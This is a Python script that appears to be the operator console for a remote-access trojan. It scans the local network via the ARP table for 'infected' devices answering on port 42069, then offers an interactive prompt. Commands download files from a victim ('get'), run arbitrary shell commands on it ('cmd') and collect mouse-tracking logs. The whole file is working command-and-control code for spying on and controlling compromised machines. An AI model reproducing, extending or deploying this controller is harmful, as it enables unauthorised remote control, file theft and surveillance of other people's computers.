import requests, os,re, colorama
print("Finding devices infected...")
devices = ["127.0.0.1"]
for device in os.popen('arp -a'): devices.append(device)
pattern=re.compile(r'(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})')
copy2=devices
for device in devices:
    copy2[copy2.index(device)] = pattern.search(device)[0]
devices = copy2
copy=devices
tmp=[]
continueflag=False
devices.append("iptype")
for device in devices:
    try:
        r=requests.post("http://"+device+":42069/check")
    except:
        class r:
            text=None
    if r.text == "READY":
        tmp.append(device)
        print(device)
    else:
        copy.remove(device)
devices = copy
while True:
    for device in devices:
        print(colorama.Fore.GREEN,device,colorama.Fore.RESET)
    print(colorama.Fore.RED,"please input the ip of the device to connect to",colorama.Fore.RESET)
    if not continueflag:
        ans=input(f"{colorama.Fore.RED}{colorama.Back.WHITE}>{colorama.Style.RESET_ALL}")
    if not pattern.match(ans) or ans not in devices:
        print("please input an ip from the list")
    elif ans in devices and not pattern.match(ans):
        ans=input(f"{colorama.Fore.RED}please enter the ip you want to manually connect to\n{colorama.Back.WHITE}>{colorama.Style.RESET_ALL}")
        continueflag=True
    elif ans in devices and pattern.match(ans) or continueflag:
        continueflag=False
        if not ans == "127.0.0.1":
            print(f"connecting to {colorama.Fore.CYAN}{ans}{colorama.Fore.RESET}")
        elif ans == "127.0.0.1":
            print(f"connecting to {colorama.Fore.CYAN}SELF{colorama.Fore.RESET}")
        connection=ans+":42069"
        r = requests.post(f"http://{connection}/check")
        if r.text == "READY":
            connected=True
            while connected:
                try:
                    print(requests.post(f"http://{connection}/check").text)
                except requests.exceptions.ConnectionError:
                    print("DISCONNECTED")
                    conected=False
                ans = input(f"awaiting action:\n{colorama.Fore.RED}{colorama.Back.WHITE}>{colorama.Fore.RESET}{colorama.Back.RESET}")
                argv = ans.split(" ")
                if argv[0] == "check":
                    try:
                        print(requests.post(f"http://{connection}/check").text)
                    except requests.exceptions.ConnectionError:
                        print("DISCONNECTED")
                        conected=False
                elif argv[0] == "get":
                    argv.append([])
                    argv[2]=argv[1].split("/")
                    filename = argv[2][len(argv[2])-1]
                    resp = requests.post(f'http://{connection}/get?file={argv[1]}',stream=True)
                    with open(f"{filename}","wb+") as file:
                        for chunk in resp.iter_content(chunk_size=1024):
                            if chunk:
                                file.write(chunk)
                        file.close()
                elif argv[0] == "cmd":
                    argv = argv[1:]
                    argf=""
                    for arg in argv:
                        argf = argf+" "+arg
                    print(f"{requests.post(f'http://{connection}/command?cmd={argf}').text}")
                elif argv[0] == "tracking":
                    if argv[1] == "mouse":
                        resp1 = requests.post(f'http://{connection}/tracking/mouse?start')
                        if resp1.text == "ALREADY STARTED":
                            import datetime
                            with open(f"{datetime.datetime.utcnow().strftime('%s')}_mouse.log","w") as logfile:
                                logfile.write(f"{requests.post(f'http://{connection}/tracking/mouse?stop').text}")